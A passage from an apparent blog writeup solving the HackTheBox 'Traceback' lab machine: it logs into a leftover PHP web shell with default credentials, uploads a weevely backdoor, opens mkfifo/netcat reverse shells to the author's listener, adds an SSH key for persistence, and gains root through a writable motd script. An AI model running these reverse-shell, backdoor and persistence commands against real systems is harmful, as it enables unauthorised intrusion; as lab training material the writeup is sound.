&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;

&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;SmEvK v3&lt;/title&gt;
&lt;<span class="nb">link </span><span class="nv">href</span><span class="o">=</span><span class="s2">"https://fonts.googleapis.com/css?family=Josefin+Sans:400,100"</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span><span class="o">&gt;</span>
&lt;/head&gt;
&lt;style&gt;
body<span class="o">{</span>
   font-family: Josefin Sans, sans-serif<span class="p">;</span>
    background: black<span class="p">;</span>
    color:#ABEFFF<span class="p">;</span>
<span class="o">}</span>
    .loginpage img<span class="o">{</span>
        width: 500px<span class="p">;</span>
        height: 150px<span class="p">;</span>
    <span class="o">}</span>
    .loginpage<span class="o">{</span>
        height: 400px<span class="p">;</span>
        width: 500px<span class="p">;</span>
        border:1px solid<span class="p">;</span>
        border-color:#ABEFFF<span class="p">;</span>
        text-align: center<span class="p">;</span>
        border-radius: 5px<span class="p">;</span>
        margin-top: 100px<span class="p">;</span>
    <span class="o">}</span>
    <span class="c">#pageheading{</span>
        font-size:25px<span class="p">;</span>
        color:#ABEFFF<span class="p">;</span>
        margin-top: 10px<span class="p">;</span>
    <span class="o">}</span>
    .loginpage img<span class="o">{</span>
        width: 500px<span class="p">;</span>
    
    <span class="o">}</span>
    input<span class="o">{</span>
        background: black<span class="p">;</span>
        border-color:#ABEFFF<span class="p">;</span>
        border-radius: 10px<span class="p">;</span>
        margin-top: 10px<span class="p">;</span> 
        padding:5px<span class="p">;</span>
        color: <span class="c">#ABEFFF;</span>
    <span class="o">}</span>
     input:hover<span class="o">{</span>
        background: <span class="c">#ABEFFF;</span>
        color: red<span class="p">;</span>

     <span class="o">}</span>

&lt;/style&gt;
&lt;body&gt;
&lt;center&gt;
&lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"loginpage"</span><span class="o">&gt;</span>
    &lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"/bg.jpg"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"Smevk Logo"</span><span class="o">&gt;</span>
    &lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"pageheading"</span><span class="o">&gt;</span>SmEvK_PaThAn Shell V3&lt;/div&gt;
    &lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span><span class="o">&gt;</span>
        User Name: &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"uname"</span> <span class="o">&gt;</span>&lt;br&gt;
        Password :  &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"pass"</span> <span class="o">&gt;</span>&lt;br&gt;
       &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"login"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Login"</span><span class="o">&gt;</span>
 &lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /wso2.8.5.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;

</pre></table></code></div></div><p>as you can see they all return a Not Found error except for <code class="language-plaintext highlighter-rouge">smevk.php</code> which is our key to the machine ;)</p><p>By visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.181/smevk.php</code> we got a login webpage for the webshell,and the file we cloned earlier already contain default creds:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>~/HackTheBox/TraceBack/Web-Shells ❯ <span class="nb">head</span> <span class="nt">-n</span> 22 smevk.php                                                                                                  02:42:47 PM
&lt;?php 
/<span class="k">*</span>

SmEvK_PaThAn Shell v3 Coded by Kashif Khan <span class="nb">.</span>
https://www.facebook.com/smevkpathan
smevkpathan@gmail.com
Edit Shell according to your choice.
Domain <span class="nb">read </span>bypass.
Enjoy!

<span class="k">*</span>/
//Make your setting here.
<span class="nv">$deface_url</span> <span class="o">=</span> <span class="s1">'http://pastebin.com/raw.php?i=FHfxsFGT'</span><span class="p">;</span>  //deface url here<span class="o">(</span>pastebin<span class="o">)</span><span class="nb">.</span>
<span class="nv">$UserName</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>                                      //Your UserName here.
<span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>                                  //Your Password.
//Change Shell Theme here//
<span class="nv">$color</span> <span class="o">=</span> <span class="s2">"#8B008B"</span><span class="p">;</span>                                   //Fonts color modify here.
<span class="nv">$Theme</span> <span class="o">=</span> <span class="s1">'#8B008B'</span><span class="p">;</span>                                    //Change border-color accoriding to your choice.
<span class="nv">$TabsColor</span> <span class="o">=</span> <span class="s1">'#0E5061'</span><span class="p">;</span>                              //Change tabs color here.
<span class="c">#-------------------------------------------------------------------------------</span>

?&gt;
</pre></table></code></div></div><p>Using the creds I was able to login:</p><p><img src="/assets/img/traceback-webshell-login.png" alt="" /></p><p>We can see an upload function in the webshell so I immediately created a reverse webshell:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>~/HackTheBox/TraceBack ❯ weevely generate p@ssw0rd ./test.php                                                                                                        02:45:45 PM
Generated <span class="s1">'./test.php'</span> with password <span class="s1">'p@ssw0rd'</span> of 687 byte size.
</pre></table></code></div></div><p>After uploading it I was able to get a reverse shell :D</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>~/HackTheBox/TraceBack ❯ weevely http://10.10.10.181/test.php p@ssw0rd                                                                                               02:46:20 PM

<span class="o">[</span>+] weevely 4.0.1

<span class="o">[</span>+] Target:	10.10.10.181
<span class="o">[</span>+] Session:	/home/cantchasee/.weevely/sessions/10.10.10.181/test_0.session

<span class="o">[</span>+] Browse the filesystem or execute commands starts the connection
<span class="o">[</span>+] to the target. Type :help <span class="k">for </span>more information.

weevely&gt; <span class="nb">whoami
</span>webadmin
webadmin@traceback:/var/www/html <span class="nv">$ </span>
</pre></table></code></div></div><h2 id="getting-user-flag">Getting user flag</h2><p>The first thing I ever do when getting a webshell is <code class="language-plaintext highlighter-rouge">sudo -l</code> and guess what I got :D</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>webadmin@traceback:/var/www/html <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>webadmin on traceback:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User webadmin may run the following commands on traceback:
    <span class="o">(</span>sysadmin<span class="o">)</span> NOPASSWD: /home/sysadmin/luvit
webadmin@traceback:/var/www/html <span class="nv">$ </span>
</pre></table></code></div></div><p>We can run <code class="language-plaintext highlighter-rouge">luvit</code> as <code class="language-plaintext highlighter-rouge">sysadmin</code> sweet, if you don’t know luvit a little google search will give you the following:</p><p><code class="language-plaintext highlighter-rouge">Luvit implements the same API as Node.js but in lua</code></p><p>so we can run lua as <code class="language-plaintext highlighter-rouge">sysadmin</code>, I setted my netcat listener in port 4444 by running</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>~ ❯ nc <span class="nt">-lvvp</span> 4444                                              03:02:03 PM
Listening on any address 4444 <span class="o">(</span>krb524<span class="o">)</span>
</pre></table></code></div></div><p>and then runned the following command in Traceback machine in order to get a reverse shell</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>webadmin@traceback:/var/www/html <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit <span class="nt">-e</span> <span class="s1">'os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.110 4444 &gt;/tmp/f")'</span>
</pre></table></code></div></div><p>And now we are sysadmin :D</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>~ ❯ nc <span class="nt">-lvvp</span> 4444                                              03:02:03 PM
Listening on any address 4444 <span class="o">(</span>krb524<span class="o">)</span>
Connection from 10.10.10.181:44034
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
sysadmin
$ 
</span></pre></table></code></div></div><p>Let’s make it interactive and get the user flag:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
sysadmin@traceback:~<span class="nv">$ </span><span class="nb">ls
ls
</span>luvit  user.txt
sysadmin@traceback:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
36f<span class="k">**************************</span>e9d
sysadmin@traceback:~<span class="err">$</span>
</pre></table></code></div></div><h2 id="getting-root-flag">Getting root flag</h2><p>Since the machine have ssh service let’s try getting a more stable shell by getting our public key in the authorized_keys file if you don’t have one make it using <code class="language-plaintext highlighter-rouge">ssh-keygen</code> you will find it in the <code class="language-plaintext highlighter-rouge">~/.ssh/id_rsa.pub</code> file</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>sysadmin@traceback:~/.ssh<span class="nv">$ </span><span class="nb">echo </span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7B3oxhBhsMEEqemIqy+VeRFDW5QMjSNxm2MXzJaWhlUZcHNFa9aw7kCy7a+XcQ14QPZ8Q2vMp0Yc1Q1T4zIG4jUuQE+EV2TN0QaF5ogGzk152OCPgp7GOtQuvcTgm6Ozwo/Wfh4bBfWVr6IF5UQrZYvJP9f5djlq2vC3lyOtdKxmkiSUQzHkRp/gLOMHAJQXiKU32u52Vq7QGbw24dQ5U1WzpZ6IICiNGj92TiJ98PP7cpm75/G4Qyg2sruIgqmSMajz+Rkko9pfwTTzNiD6Vg+5AobSJdPNWdpTNE2y2kJpxFhDhpzUtQEe7Fof71HmHOQkATCLIAB5VIVgwdmarX9LBssRVj1FoWmSgBImrPHp1y1ClDXkFy3MHO7Ar6KnIl9C2kgWZ0M4oEe3fPoTwcpJNjwxGVeA/Kc2yxT7IW/frkGL49AWiGBvRGlru59izsosS6m/cPeM3BA+UuKP92gUnhPnx25YiYCPWyPGooAZeHdPvDiMbZZaooPIqTl0<span class="o">=</span> cantchasee@arch <span class="o">&gt;&gt;</span> authorized_keys
&lt;<span class="nv">DiMbZZaooPIqTl0</span><span class="o">=</span> cantchasee@arch <span class="o">&gt;&gt;</span> authorized_keys
sysadmin@traceback:~/.ssh<span class="nv">$ </span>
</pre></table></code></div></div><p>And now we can ssh easily to the machine as sysadmin what I love about this Is that you can ssh whenever you want like getting a user today and trying root tomorrow without the need to get your way again to user <em><strong>if the authorized_keys file remain untouched of course</strong></em> and please guys when putting your public key in use <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> to redirect output from <code class="language-plaintext highlighter-rouge">echo</code> and not <code class="language-plaintext highlighter-rouge">&gt;</code> because this will delete all other players keys so please be nice :)</p><p>Now let’s ssh to the machine:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre> ~/H/TraceBack ❯ ssh sysadmin@10.10.10.181                      03:10:53 PM
<span class="c">#################################</span>
<span class="nt">--------</span> OWNED BY XH4H  <span class="nt">---------</span>
- I guess stuff could have been configured better ^^ -
<span class="c">#################################</span>

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
<span class="nv">$ </span>
</pre></table></code></div></div><p>When listing processes that run as root, the following lines catched my eyes</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ps</span> aux | <span class="nb">grep </span>root


root       2752  0.0  0.0      0     0 ?        I    07:09   0:00 <span class="o">[</span>kworker/0:0]
root       2838  0.0  0.1 107984  7340 ?        Ss   07:12   0:00 sshd: sysadmin <span class="o">[</span>priv]
root       2908  0.0  0.0  58792  3216 ?        S    07:15   0:00 /usr/sbin/CRON <span class="nt">-f</span>
root       2910  0.0  0.0   4628   784 ?        Ss   07:15   0:00 /bin/sh <span class="nt">-c</span> <span class="nb">sleep </span>30 <span class="p">;</span> /bin/cp /var/backups/.update-motd.d/<span class="k">*</span> /etc/update-motd.d/
root       2912  0.0  0.0   7468   736 ?        S    07:15   0:00 <span class="nb">sleep </span>30

</pre></table></code></div></div><p>As we can see there is a command that repeat itself every 30 seconds, when 30 seconds pass the following is executed as root:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/bin/cp /var/backups/.update-motd.d/<span class="k">*</span> /etc/update-motd.d/
</pre></table></code></div></div><p>the command is self explaining but it’s a great hint to move for root, and now what’s that motd thing</p><p>Basically <code class="language-plaintext highlighter-rouge">motd</code> or <code class="language-plaintext highlighter-rouge">Message of the day</code> are some messages that you see when you login into a computer like what we see when we ssh as sysadmin but how does this work? well motd are just some bunch of scripts in the <code class="language-plaintext highlighter-rouge">/etc/update-motd.d/</code> directory that run when you login as you see here:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre>sysadmin@traceback:/etc<span class="nv">$ </span><span class="nb">cd </span>update-motd.d/
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">ls
</span>00-header  10-help-text  50-motd-news  80-esm  91-release-upgrade
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">cat </span>00-header 
<span class="c">#!/bin/sh</span>
<span class="c">#</span>
<span class="c">#    00-header - create the header of the MOTD</span>
<span class="c">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span class="c">#</span>
<span class="c">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span class="c">#</span>
<span class="c">#    This program is free software; you can redistribute it and/or modify</span>
<span class="c">#    it under the terms of the GNU General Public License as published by</span>
<span class="c">#    the Free Software Foundation; either version 2 of the License, or</span>
<span class="c">#    (at your option) any later version.</span>
<span class="c">#</span>
<span class="c">#    This program is distributed in the hope that it will be useful,</span>
<span class="c">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="c">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="c">#    GNU General Public License for more details.</span>
<span class="c">#</span>
<span class="c">#    You should have received a copy of the GNU General Public License along</span>
<span class="c">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span class="c">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span class="o">[</span> <span class="nt">-r</span> /etc/lsb-release <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">.</span> /etc/lsb-release


<span class="nb">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Welcome to Xh4H land </span><span class="se">\n</span><span class="s2">"</span>
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
<span class="nb">.</span>  ..  00-header  10-help-text  50-motd-news  80-esm  91-release-upgrade
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-s</span>
total 24
4 00-header  4 10-help-text  8 50-motd-news  4 80-esm  4 91-release-upgrade
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 24
<span class="nt">-rwxrwxr-x</span> 1 root sysadmin  981 Aug 13 07:17 00-header
<span class="nt">-rwxrwxr-x</span> 1 root sysadmin  982 Aug 13 07:17 10-help-text
<span class="nt">-rwxrwxr-x</span> 1 root sysadmin 4264 Aug 13 07:17 50-motd-news
<span class="nt">-rwxrwxr-x</span> 1 root sysadmin  604 Aug 13 07:17 80-esm
<span class="nt">-rwxrwxr-x</span> 1 root sysadmin  299 Aug 13 07:17 91-release-upgrade
sysadmin@traceback:/etc/update-motd.d<span class="err">$</span>
</pre></table></code></div></div><p>the 00-header contain the command</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Welcome to Xh4H land </span><span class="se">\n</span><span class="s2">"</span>
</pre></table></code></div></div><p>And if you remember when we login we got a message saying <code class="language-plaintext highlighter-rouge">Welcome to xh4h land</code> but more importantly this script is ran as root how I know <em><strong>I googled it :P</strong></em> since everyone in the sysadmin group can edit the file let’s do a check:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">echo whoami</span> <span class="o">&gt;&gt;</span> 00-header
</pre></table></code></div></div><p>Now if we ssh to the machine we will get</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>~ ❯ ssh sysadmin@10.10.10.181                                                                                                                                        03:17:59 PM
<span class="c">#################################</span>
<span class="nt">--------</span> OWNED BY XH4H  <span class="nt">---------</span>
- I guess stuff could have been configured better ^^ -
<span class="c">#################################</span>

Welcome to Xh4H land 

root


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Aug 13 07:12:54 2020 from 10.10.14.110
<span class="nv">$ </span>
</pre></table></code></div></div><p>As you see the machine say that we are root :) now all we have to do is to setup our netcat listener and put our previous reverse shell in the 00-header file:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>~ ❯ nc <span class="nt">-lvvp</span> 4444                                                                                                                                                    03:19:20 PM
Listening on any address 4444 <span class="o">(</span>krb524<span class="o">)</span>
</pre></table></code></div></div><p>in the machine we do:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">export </span><span class="nv">shell</span><span class="o">=</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.110 4444 &gt;/tmp/f"</span>
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$shell</span>
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.110 4444 <span class="o">&gt;</span>/tmp/f
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$shell</span> <span class="o">&gt;&gt;</span> 00-header
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span>
</pre></table></code></div></div><p>and then we quickly ssh before changes are reverted</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>~ ❯ ssh sysadmin@10.10.10.181
</pre></table></code></div></div><p>AND WE GOT ROOT !!!!!!! :D</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>~ ❯ nc <span class="nt">-lvvp</span> 4444                                                                                                                                                    03:19:20 PM
Listening on any address 4444 <span class="o">(</span>krb524<span class="o">)</span>
Connection from 10.10.10.181:44324
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# whoami
root
# cat root.txt
ac16*************************957
# 
</span></pre></table></code></div></div><p>It was an easy and nice box, hope you guys liked the writeup :)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox Traceback Writeup - cantchasee&url=https://cantchasee.github.io/posts/HTB-Traceback-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox Traceback Writeup - cantchasee&u=https://cantchasee.github.io/posts/HTB-Traceback-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox Traceback Writeup - cantchasee&url=https://cantchasee.github.io/posts/HTB-Traceback-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Traceback-Writeup/">HackTheBox Traceback Writeup</a></li><li><a href="/posts/HTB-BlackField-Writeup/">HackTheBox BlackField Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/rsa/">RSA</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/hard/">Hard</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Doctor-Writeup/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 23 <i class="unloaded">2020-10-23T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Doctor Writeup</h3><div class="text-muted small"><p> Doctor is a linux machine that is ranked easy and trust me it’s not easy :| Recon So as usally let’s start with a fast nmap scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌─[cantchasee@parrot]─[~/Hack...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Bucket-Writeup/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 29 <i class="unloaded">2020-10-29T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Bucket Writeup</h3><div class="text-muted small"><p> Hello guys,in this writeup we will hack Bucket wich is an awesome box, we will need to abuse a misconfigured s3 bucket that’s the correct name I guess in order to upload a php file and achieve RCE ...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-BlackField-Writeup/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 25 <i class="unloaded">2020-08-25T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox BlackField Writeup</h3><div class="text-muted small"><p> Hello guys, BlackField is a hard HTB machine but it’s really funny I think it’s the best box i’ve ever done so here is the writeup :) Recon So at always we start with an nmap scan 1 2 3 4 5 6 7 8...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled"><p>-</p></span> <a href="/posts/HTB-BlackField-Writeup/" class="btn btn-outline-primary"><p>HackTheBox BlackField Writeup</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://github.com/cantchasee/">cantchasee</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/rsa/">RSA</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/hard/">Hard</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas 